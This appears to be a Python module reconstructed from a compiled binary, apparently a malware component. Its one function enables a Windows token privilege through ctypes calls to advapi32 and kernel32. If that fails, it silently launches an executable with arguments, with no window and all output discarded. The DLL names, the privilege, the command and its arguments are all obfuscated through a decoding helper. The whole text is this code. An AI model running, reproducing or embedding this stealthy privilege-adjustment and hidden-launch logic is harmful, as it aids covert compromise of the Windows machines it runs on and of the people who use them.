# Recovered module: src.py.com.yun.mao.kv_nx.aq_m7_ln_c2
# Entry confirmed by module init at 0x572dbf0 and the terminal constants row.
from __future__ import annotations

import ctypes
import subprocess
from ctypes import wintypes

from ..link._fds_jm import sec


def xz_o4_go() -> None:
    """Enable a token privilege, then run the encoded fallback command.

    Inferred: the native API sequence comes from the advapi32/kernel32 string
    cluster; the fallback command ordering comes from the five encoded values.
    """

    class _LUID(ctypes.Structure):
        _fields_ = [("LowPart", wintypes.DWORD), ("HighPart", wintypes.LONG)]

    class _LAA(ctypes.Structure):
        _fields_ = [("Luid", _LUID), ("Attributes", wintypes.DWORD)]

    class _TP(ctypes.Structure):
        _fields_ = [("PrivilegeCount", wintypes.DWORD), ("Privileges", _LAA * 1)]

    _sy = ctypes
    _z = wintypes
    _primed = False
    _ct = ctypes
    _wt = wintypes

    _dll_a = ctypes.WinDLL(sec(r"fg_vn_9c"), use_last_error=True)
    _dll_k = ctypes.WinDLL(sec(r"gh_wo_4r"), use_last_error=True)
    _dll_u = ctypes.WinDLL(sec(r"hi_xp_7m"), use_last_error=True)
    _api = sec(r"ij_yq_0b")
    _priv = sec(r"jk_zr_3t")
    _ = _api

    _k32 = _dll_k
    _a32 = _dll_a
    _u32 = _dll_u
    _ = (_sy, _z, _ct, _wt, _u32)

    _k32.GetCurrentProcess.restype = wintypes.HANDLE
    _a32.OpenProcessToken.argtypes = [
        wintypes.HANDLE,
        wintypes.DWORD,
        ctypes.POINTER(wintypes.HANDLE),
    ]
    _a32.OpenProcessToken.restype = wintypes.BOOL
    _a32.LookupPrivilegeValueW.argtypes = [
        wintypes.LPCWSTR,
        wintypes.LPCWSTR,
        ctypes.POINTER(_LUID),
    ]
    _a32.LookupPrivilegeValueW.restype = wintypes.BOOL
    _a32.AdjustTokenPrivileges.argtypes = [
        wintypes.HANDLE,
        wintypes.BOOL,
        ctypes.POINTER(_TP),
        wintypes.DWORD,
        ctypes.c_void_p,
        ctypes.c_void_p,
    ]
    _a32.AdjustTokenPrivileges.restype = wintypes.BOOL
    _k32.CloseHandle.argtypes = [wintypes.HANDLE]
    _k32.CloseHandle.restype = wintypes.BOOL

    _fn = _a32.OpenProcessToken
    _priv_ok = False
    _tok = wintypes.HANDLE()
    _luid = _LUID()
    _tp = _TP()
    if _fn(_k32.GetCurrentProcess(), 40, ctypes.byref(_tok)):
        if _a32.LookupPrivilegeValueW(None, _priv, ctypes.byref(_luid)):
            _tp.PrivilegeCount = 1
            _tp.Privileges[0].Luid = _luid
            _tp.Privileges[0].Attributes = 2
            ctypes.set_last_error(0)
            _priv_ok = bool(
                _a32.AdjustTokenPrivileges(
                    _tok,
                    False,
                    ctypes.byref(_tp),
                    0,
                    None,
                    None,
                )
            )
            if ctypes.get_last_error() == 1300:
                _priv_ok = False
        _k32.CloseHandle(_tok)
    _primed = _priv_ok

    if not _primed:
        _sp_fb = subprocess
        _exe_fb = sec(r"zp_uq_6n")
        _args_fb = [
            sec(r"bv_lt_8p"),
            sec(r"cw_rj_1a"),
            sec(r"dy_sk_5e"),
            sec(r"ez_um_2w"),
        ]
        _cf_fb = _sp_fb.CREATE_NO_WINDOW
        _sp_fb.Popen(
            [_exe_fb, *_args_fb],
            shell=False,
            stdin=_sp_fb.DEVNULL,
            stdout=_sp_fb.DEVNULL,
            stderr=_sp_fb.DEVNULL,
            creationflags=_cf_fb,
        )
